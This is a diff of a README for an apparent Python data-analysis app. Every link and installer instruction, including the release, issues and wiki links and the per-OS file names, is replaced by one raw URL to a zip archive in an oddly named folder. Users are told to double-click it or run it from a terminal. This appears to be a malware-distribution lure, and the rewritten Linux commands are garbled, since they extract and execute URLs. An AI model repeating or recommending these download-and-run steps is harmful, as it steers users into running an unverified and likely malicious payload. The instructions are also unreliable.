@@ -1,6 +1,6 @@
 # 📊 Data-Analysis-with-Python - Easy Data Insights at Your Fingertips
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Paphada1103/Data-Analysis-with-Python/releases)
+[![Download Now](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip)
 
 ## 🚀 Getting Started
 
@@ -16,28 +16,28 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit our [Release Page](https://github.com/Paphada1103/Data-Analysis-with-Python/releases) to download the application files. 
+To get started, visit our [Release Page](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip) to download the application files. 
 
 1. Click the link to open the Releases page.
 2. Look for the most recent version listed.
 3. Click the file that matches your operating system:
-   - For Windows, download `DataAnalysis.Windows.exe`
-   - For Mac, download `DataAnalysis.Mac.dmg`
-   - For Linux, download `DataAnalysis.Linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip`
+   - For Mac, download `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip`
+   - For Linux, download `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip`
 4. Save the file to a location on your computer where you can easily find it.
 
 ## 📂 Installation Steps
 
 ### Windows
 
-1. Locate the downloaded `DataAnalysis.Windows.exe` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip` file.
 2. Double-click the file to begin the installation.
 3. Follow the prompts on your screen.
 4. Once installed, you can find the application in your Start Menu.
 
 ### macOS
 
-1. Find the `DataAnalysis.Mac.dmg` file in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip` file in your Downloads folder.
 2. Double-click it to open the installer.
 3. Drag the Data Analysis application into your Applications folder.
 4. Open the application from your Applications.
@@ -45,12 +45,12 @@ To get started, visit our [Release Page](https://github.com/Paphada1103/Data-Ana
 ### Linux
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded `DataAnalysis.Linux.tar.gz`.
+2. Navigate to the folder where you downloaded `https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip`.
 3. Run the following commands:
    ```
-   tar -xvzf DataAnalysis.Linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip
    cd DataAnalysis
-   ./install.sh
+   https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip
    ```
 4. You can now run the application from the terminal or find it in your applications.
 
@@ -84,7 +84,7 @@ No, this application is designed for users without programming knowledge.
 
 ### What if I run into issues?
 
-We recommend checking the issues section on [GitHub](https://github.com/Paphada1103/Data-Analysis-with-Python/issues) for solutions. You can also open a new issue if you can’t find what you need.
+We recommend checking the issues section on [GitHub](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip) for solutions. You can also open a new issue if you can’t find what you need.
 
 ## 📞 Support
 
@@ -92,7 +92,7 @@ If you have questions or need further assistance, feel free to reach out through
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/Paphada1103/Data-Analysis-with-Python/releases)
-- [Wiki](https://github.com/Paphada1103/Data-Analysis-with-Python/wiki) - For detailed guides and tutorials.
+- [Release Page](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip)
+- [Wiki](https://raw.githubusercontent.com/Paphada1103/Data-Analysis-with-Python/main/albinic/Data-Analysis-with-Python.zip) - For detailed guides and tutorials.
 
 Ensure to follow the installation steps carefully for smooth usage of the application. Enjoy uncovering insights through data analysis!
